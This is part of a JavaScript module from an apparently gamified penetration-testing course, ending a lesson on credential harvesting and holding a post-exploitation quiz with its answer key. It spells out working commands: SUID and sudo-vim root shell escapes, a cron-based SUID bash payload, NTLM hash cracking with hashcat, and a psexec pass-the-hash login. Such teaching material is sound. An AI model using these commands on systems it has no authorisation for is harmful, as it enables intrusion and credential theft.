    The number one source of credentials on real pentests: <strong>configuration files and scripts</strong>. Developers hardcode database passwords in <code>wp-config.php</code>, store API keys in <code>.env</code> files, and leave SSH keys with no passphrase. Always check web app config files first — they almost always contain database credentials that might be reused for system accounts.
  </div>

  <div class="key-point">
    <strong>Post-exploitation checklist:</strong> (1) Check what user you are and your privileges, (2) Dump hashes or read shadow, (3) Look for config files with passwords, (4) Check for SSH keys, (5) Look at command history, (6) Check environment variables, (7) Search for backups and scripts.
  </div>

  <!-- ==================== QUIZ SECTION ==================== -->
  <div class="section-complete">
    <div class="check">🎯</div>
    <h2>Ready to Test Your Knowledge?</h2>
    <p style="color: var(--text-dim); margin-bottom: 8px;">12 questions covering Windows attacks, Linux privilege escalation, hash cracking, and credential harvesting. Score 70%+ to earn full XP.</p>
    <button class="btn-primary quiz-start-btn" id="start-quiz-btn">Start Field Test</button>
    <br><br>
    <button class="btn-secondary" id="complete-topic-btn">Mark as Complete (Skip Quiz)</button>
  </div>

</article>
  `;
}

// ==================== QUIZ DATA ====================
export const quiz = [
  {
    type: 'mcq',
    question: 'You dumped a Windows hash: aad3b435b51404ee:e02bc503339d51f71d913c245d35b50b. What type of hash is the second half?',
    options: [
      'SHA-256',
      'MD5',
      'NTLM',
      'bcrypt'
    ],
    correct: 2,
    explanation: 'Windows stores passwords as NTLM hashes. The format from hashdump is LM_Hash:NTLM_Hash. The second half (32 hex chars) is the NTLM hash — the one you want to crack or pass.'
  },
  {
    type: 'mcq',
    question: 'What makes Pass-the-Hash possible on Windows?',
    options: [
      'Windows encrypts all passwords with AES',
      'NTLM authentication accepts the hash directly — no password needed',
      'Windows stores passwords in plaintext',
      'The SAM database is world-readable'
    ],
    correct: 1,
    explanation: 'NTLM authentication works by comparing hashes. The protocol never needs the actual password — just the hash. So if you have the hash, you can authenticate as that user without cracking it.'
  },
  {
    type: 'type-command',
    question: 'You have a file called "hashes.txt" with NTLM hashes. Write the hashcat command to crack them using rockyou.txt:',
    scenario: 'Crack NTLM hashes from hashes.txt using the rockyou.txt wordlist.',
    validAnswers: [
      'hashcat -m 1000 hashes.txt rockyou.txt',
      'hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt',
      'hashcat -m 1000 -a 0 hashes.txt rockyou.txt'
    ],
    hint: 'hashcat -m [mode] [hashfile] [wordlist] — NTLM mode is 1000',
    explanation: 'hashcat -m 1000 specifies NTLM hash mode. Then provide the hash file and wordlist. -a 0 (dictionary attack) is the default and can be omitted.'
  },
  {
    type: 'mcq',
    question: 'You find a Linux binary with the SUID bit set: -rwsr-xr-x 1 root root /usr/bin/find. What does this mean?',
    options: [
      'Only root can execute it',
      'It runs as root regardless of who executes it',
      'It cannot be modified',
      'It runs in a sandbox'
    ],
    correct: 1,
    explanation: 'The SUID bit (the "s" in rws) means the binary runs with the permissions of its owner — in this case root. If find has SUID and you can use -exec, you can spawn a root shell: find . -exec /bin/sh -p \\;'
  },
  {
    type: 'drag-match',
    question: 'Match each tool to its purpose:',
    pairs: [
      { label: 'mimikatz', value: 'Dump credentials from Windows memory' },
      { label: 'hashcat', value: 'GPU-accelerated password cracking' },
      { label: 'hydra', value: 'Online brute force against services' },
      { label: 'secretsdump.py', value: 'Remote hash extraction via Impacket' },
      { label: 'john', value: 'CPU-based password cracking' }
    ]
  },
  {
    type: 'mcq',
    question: 'You run "sudo -l" and see: (root) NOPASSWD: /usr/bin/vim. How do you escalate?',
    options: [
      'sudo vim /etc/shadow and read the hashes',
      'sudo vim -c \':!/bin/bash\'',
      'sudo vim /etc/passwd and delete root\'s password',
      'You cannot escalate with vim'
    ],
    correct: 1,
    explanation: 'vim can execute shell commands with :!command. Running sudo vim -c \':!/bin/bash\' opens vim as root and immediately spawns a bash shell — giving you a root shell.'
  },
  {
    type: 'type-command',
    question: 'Find all SUID binaries on a Linux system. Write the command:',
    scenario: 'You need to enumerate SUID binaries for privilege escalation.',
    validAnswers: [
      'find / -perm -4000 -type f 2>/dev/null',
      'find / -perm -4000 2>/dev/null',
      'find / -perm -u=s -type f 2>/dev/null'
    ],
    hint: 'find / -perm ... -type f 2>/dev/null',
    explanation: 'find / -perm -4000 searches the entire filesystem for files with the SUID bit (4000) set. -type f limits to files. 2>/dev/null suppresses permission errors.'
  },
  {
    type: 'mcq',
    question: 'Which Windows file on a Domain Controller contains ALL domain user password hashes?',
    options: [
      'C:\\Windows\\System32\\config\\SAM',
      'C:\\Windows\\NTDS\\NTDS.dit',
      'C:\\Windows\\System32\\config\\SYSTEM',
      'C:\\Windows\\Panther\\unattend.xml'
    ],
    correct: 1,
    explanation: 'NTDS.dit is the Active Directory database on Domain Controllers. It contains every domain user account and their NTLM password hash. SAM only has local accounts.'
  },
  {
    type: 'mcq',
    question: 'A cron job runs /opt/cleanup.sh as root every 5 minutes. The script is writable by your user. What is the fastest path to root?',
    options: [
      'Delete the cron job',
      'Append a reverse shell or SUID bash command to the script',
      'Change the script owner to your user',
      'Restart the cron service'
    ],
    correct: 1,
    explanation: 'If a root cron job runs a writable script, append your payload (e.g., "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"). When cron executes it as root, you get a SUID bash shell.'
  },
  {
    type: 'drag-match',
    question: 'Match each hash identifier to its type:',
    pairs: [
      { label: '$6$', value: 'SHA-512 (Linux shadow)' },
      { label: '$1$', value: 'MD5 (old Linux)' },
      { label: '32 hex chars (Windows)', value: 'NTLM' },
      { label: '$2b$', value: 'bcrypt' }
    ]
  },
  {
    type: 'mcq',
    question: 'What is the purpose of a UAC bypass?',
    options: [
      'Escalate a standard user to administrator',
      'Bypass firewall rules',
      'Elevate an admin user\'s filtered token to full admin without the UAC prompt',
      'Disable Windows Defender'
    ],
    correct: 2,
    explanation: 'UAC bypass doesn\'t make a standard user an admin. It removes the restriction on an admin user whose token is filtered by UAC, allowing full admin privileges without triggering the consent prompt.'
  },
  {
    type: 'type-command',
    question: 'You want to use Impacket\'s psexec to authenticate to 10.10.10.5 as "administrator" using an NTLM hash (aad3b435b51404ee:e02bc503339d51f71d913c245d35b50b). Write the command:',
    scenario: 'Perform a pass-the-hash attack to get a shell on the target.',
    validAnswers: [
      'psexec.py -hashes aad3b435b51404ee:e02bc503339d51f71d913c245d35b50b administrator@10.10.10.5',
      'psexec.py administrator@10.10.10.5 -hashes aad3b435b51404ee:e02bc503339d51f71d913c245d35b50b'
    ],
    hint: 'psexec.py -hashes LM:NTLM user@target',
    explanation: 'psexec.py from Impacket uses the -hashes flag with the format LM:NTLM to perform pass-the-hash authentication. This gives you a SYSTEM shell on the target without knowing the plaintext password.'
  }
];

// ==================== INTERACTIVES ====================
export function bindInteractives() {
  // No custom interactives for this module — try-it buttons
  // are handled globally by the course framework.
}
